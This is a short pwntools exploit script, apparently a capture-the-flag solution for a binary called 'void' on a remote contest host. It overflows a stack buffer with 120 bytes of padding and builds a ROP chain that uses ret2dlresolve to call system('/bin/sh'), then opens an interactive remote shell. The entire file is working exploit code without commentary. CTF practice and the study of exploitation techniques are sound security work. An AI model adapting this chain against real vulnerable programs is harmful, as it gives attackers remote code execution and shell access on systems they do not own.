import pwn 
from pwn import *

elf = context.binary = ELF("./void")
#p = elf.process()
p = remote("netcat.deadsec.quest", 31794)
rop = ROP(elf)

dlresolve = Ret2dlresolvePayload(elf, symbol="system", args=[b"/bin/sh"])

rop.raw(b"A"*120)
rop.read(0,dlresolve.data_addr)
rop.ret2dlresolve(dlresolve)

log.info(rop.dump())
p.sendline(rop.chain())
p.sendlineafter(b"cape! ",dlresolve.payload)
p.interactive()
